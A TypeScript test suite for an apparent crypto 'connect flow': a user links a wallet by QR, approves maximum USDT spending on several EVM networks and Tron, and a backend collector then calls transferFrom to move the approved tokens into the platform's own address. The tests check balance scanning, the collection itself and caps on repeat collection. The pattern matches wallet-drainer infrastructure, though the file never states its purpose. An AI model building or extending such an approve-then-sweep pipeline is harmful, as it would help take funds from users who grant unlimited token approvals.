import assert from "node:assert/strict";
import test from "node:test";
import { getSpenderForNetwork } from "../../src/types/connect-flow-props";
import {
  assertPlatformSpendersConfigured,
  loadTestPlatformSnapshot,
} from "./platform-env-fixture";
import {
  authorizeNetwork,
  runFullLinkFlowMock,
  simulateQrToNetworks,
  TEST_EVM_OWNER,
  TEST_TRON_OWNER,
} from "./mock-link-flow";
import {
  buildConnectFlowTestReport,
  diagnosticFlowReport,
  type CollectorTransferResult,
} from "./test-report";
import {
  CollectorFlowMock,
  registerApprovalsFromAuthItems,
} from "../../../../backend/test/connect-flow/collector-flow-mock";

const platform = loadTestPlatformSnapshot();
assertPlatformSpendersConfigured(platform);

const EVM_LINKED = { evm: TEST_EVM_OWNER, tron: null as string | null };
const TRON_LINKED = { evm: null as string | null, tron: TEST_TRON_OWNER };
const FUNDED = { allowance: BigInt(50_000_000), balance: BigInt(25_000_000) };

function collectorTransfersFromMock(
  collector: CollectorFlowMock,
): CollectorTransferResult[] {
  return collector.transfers.map((transfer) => {
    const approval = collector.approvals.get(transfer.approvalId);
    return {
      network: approval?.network ?? "unknown",
      token: approval?.tokenSymbol ?? "unknown",
      approvalId: transfer.approvalId,
      txHash: transfer.txHash,
      amountRaw: transfer.amountRaw,
      fromAddress: transfer.fromAddress,
      spenderAddress: approval?.spenderAddress ?? transfer.toAddress,
      toAddress: transfer.toAddress,
    };
  });
}

test("full pipeline: QR → approve → backend collector transferFrom", async (t) => {
  const networkKey =
    platform.enabledNetworks.find((n) => n !== "tron") ?? "bsc";
  const scan = await simulateQrToNetworks({
    platform,
    linked: EVM_LINKED,
    balanceScenario: "all_funded",
  });
  const network =
    scan.networks.find((n) => n.key === networkKey) ?? scan.networks[0];
  assert.ok(network);

  const auth = await authorizeNetwork({
    platform,
    network,
    linked: EVM_LINKED,
    preferences: {
      [network.key]: {
        USDT: { included: true, mode: "maximum", amountHuman: "" },
        USDC: { included: false, mode: "maximum", amountHuman: "" },
        NATIVE: { included: false, mode: "maximum", amountHuman: "" },
      },
    },
  });

  assert.equal(auth.summary.failedCount, 0);
  const usdtItem = auth.summary.items.find((i) => i.token === "USDT");
  assert.ok(usdtItem?.txHash);

  const collector = new CollectorFlowMock(platform);
  const [approval] = registerApprovalsFromAuthItems({
    mock: collector,
    network: network.key,
    owner: TEST_EVM_OWNER,
    items: auth.summary.items.map((i) => ({
      token: i.token,
      outcome: i.outcome,
      txHash: i.txHash,
    })),
    fundBalances: { USDT: FUNDED },
  });
  assert.ok(approval);

  const expectedSpender = getSpenderForNetwork(
    { platform: platform.publicConfig },
    network.key,
  );
  assert.equal(approval.spenderAddress, expectedSpender);
  assert.equal(approval.spenderAddress, platform.spenderEvm);

  const collectResult = collector.runCollector(approval.id);
  assert.ok(collectResult?.txHash);
  assert.equal(collectResult?.spenderAddress, platform.spenderEvm);
  assert.equal(collectResult?.toAddress, platform.spenderEvm);
  assert.equal(collector.transfers[0]?.toAddress, platform.spenderEvm);
  assert.equal(collector.transfers[0]?.fromAddress, TEST_EVM_OWNER);

  diagnosticFlowReport(
    t,
    buildConnectFlowTestReport({
      platform,
      authorizations: { [network.key]: auth },
      collectorTransfers: collectorTransfersFromMock(collector),
    }),
  );
});

test("full pipeline all EVM networks: link flow then collector on each", async (t) => {
  const { scan, authorizations, spendersByNetwork } = await runFullLinkFlowMock(
    {
      platform,
      linked: EVM_LINKED,
      balanceScenario: "all_funded",
      balanceSeed: 808,
    },
  );

  const collector = new CollectorFlowMock(platform);

  for (const network of scan.networks) {
    const auth = authorizations[network.key];
    assert.ok(auth, network.key);
    assert.equal(auth.spenderAddress, spendersByNetwork[network.key]);

    const approvals = registerApprovalsFromAuthItems({
      mock: collector,
      network: network.key,
      owner: TEST_EVM_OWNER,
      items: auth.summary.items.map((i) => ({
        token: i.token,
        outcome: i.outcome,
        txHash: i.txHash,
      })),
      fundBalances: {
        USDT: FUNDED,
        USDC: FUNDED,
      },
    });

    for (const approval of approvals) {
      assert.equal(approval.spenderAddress, platform.spenderEvm);
      const result = collector.runCollector(approval.id);
      assert.ok(result?.txHash, `${network.key}:${approval.tokenSymbol}`);
      assert.equal(result?.spenderAddress, platform.spenderEvm);
      assert.equal(result?.toAddress, platform.spenderEvm);
    }
  }

  assert.ok(collector.transfers.length >= scan.networks.length);
  assert.ok(
    collector.transfers.every((tr) => tr.toAddress === platform.spenderEvm),
  );

  diagnosticFlowReport(
    t,
    buildConnectFlowTestReport({
      platform,
      authorizations,
      collectorTransfers: collectorTransfersFromMock(collector),
    }),
  );
});

test("Tron pipeline: approve → collector uses platform TRON spender", async (t) => {
  if (!platform.enabledNetworks.includes("tron")) return;

  const { networks } = await simulateQrToNetworks({
    platform,
    linked: TRON_LINKED,
    balanceScenario: "all_funded",
  });
  const tron = networks[0];

  const auth = await authorizeNetwork({
    platform,
    network: tron,
    linked: TRON_LINKED,
    preferences: {
      tron: {
        USDT: { included: true, mode: "maximum", amountHuman: "" },
        USDC: { included: false, mode: "maximum", amountHuman: "" },
        NATIVE: { included: false, mode: "maximum", amountHuman: "" },
      },
    },
  });

  const collector = new CollectorFlowMock(platform);
  const [approval] = registerApprovalsFromAuthItems({
    mock: collector,
    network: "tron",
    owner: TEST_TRON_OWNER,
    items: auth.summary.items.map((i) => ({
      token: i.token,
      outcome: i.outcome,
      txHash: i.txHash,
    })),
    fundBalances: { USDT: FUNDED },
  });
  assert.ok(approval);
  assert.equal(auth.spenderAddress, platform.spenderTron);

  const result = collector.runCollector(approval.id);
  assert.ok(result?.txHash);
  assert.equal(result?.spenderAddress, platform.spenderTron);
  assert.equal(result?.toAddress, platform.spenderTron);
  assert.equal(collector.transfers[0]?.toAddress, platform.spenderTron);

  diagnosticFlowReport(
    t,
    buildConnectFlowTestReport({
      platform,
      authorizations: { tron: auth },
      collectorTransfers: collectorTransfersFromMock(collector),
    }),
  );
});

test("collector max runs stops repeated collection after approve", async (t) => {
  const networkKey =
    platform.enabledNetworks.find((n) => n !== "tron") ?? "eth";
  const scan = await simulateQrToNetworks({
    platform,
    linked: EVM_LINKED,
    balanceScenario: "all_funded",
  });
  const network =
    scan.networks.find((n) => n.key === networkKey) ?? scan.networks[0];

  const auth = await authorizeNetwork({
    platform,
    network,
    linked: EVM_LINKED,
    preferences: {
      [network.key]: {
        USDT: { included: true, mode: "maximum", amountHuman: "" },
        USDC: { included: false, mode: "maximum", amountHuman: "" },
        NATIVE: { included: false, mode: "maximum", amountHuman: "" },
      },
    },
  });

  const collector = new CollectorFlowMock(platform, { maxRuns: 1 });
  const [approval] = registerApprovalsFromAuthItems({
    mock: collector,
    network: network.key,
    owner: TEST_EVM_OWNER,
    items: auth.summary.items.map((i) => ({
      token: i.token,
      outcome: i.outcome,
      txHash: i.txHash,
    })),
    fundBalances: {
      USDT: { allowance: BigInt(1_000_000), balance: BigInt(0) },
    },
  });
  assert.ok(approval);

  collector.runCollector(approval.id);
  collector.runCollector(approval.id);

  assert.equal(collector.approvals.get(approval.id)?.collectorRunCount, 1);
  assert.equal(collector.approvals.get(approval.id)?.collectionEnabled, false);

  diagnosticFlowReport(
    t,
    buildConnectFlowTestReport({
      platform,
      authorizations: { [network.key]: auth },
    }),
  );
});

test("collector disabled in platform.env skips post-approve collection", async (t) => {
  const networkKey =
    platform.enabledNetworks.find((n) => n !== "tron") ?? "eth";
  const scan = await simulateQrToNetworks({
    platform,
    linked: EVM_LINKED,
    balanceScenario: "all_funded",
  });
  const network =
    scan.networks.find((n) => n.key === networkKey) ?? scan.networks[0];

  const auth = await authorizeNetwork({
    platform,
    network,
    linked: EVM_LINKED,
    preferences: {
      [network.key]: {
        USDT: { included: true, mode: "maximum", amountHuman: "" },
        USDC: { included: false, mode: "maximum", amountHuman: "" },
        NATIVE: { included: false, mode: "maximum", amountHuman: "" },
      },
    },
  });

  const collector = new CollectorFlowMock(platform, {
    collectorEnabled: false,
  });
  const [approval] = registerApprovalsFromAuthItems({
    mock: collector,
    network: network.key,
    owner: TEST_EVM_OWNER,
    items: auth.summary.items.map((i) => ({
      token: i.token,
      outcome: i.outcome,
      txHash: i.txHash,
    })),
    fundBalances: { USDT: FUNDED },
  });
  assert.ok(approval);

  const result = collector.runCollector(approval.id);
  assert.equal(result, null);
  assert.equal(collector.transfers.length, 0);

  diagnosticFlowReport(
    t,
    buildConnectFlowTestReport({
      platform,
      authorizations: { [network.key]: auth },
    }),
  );
});
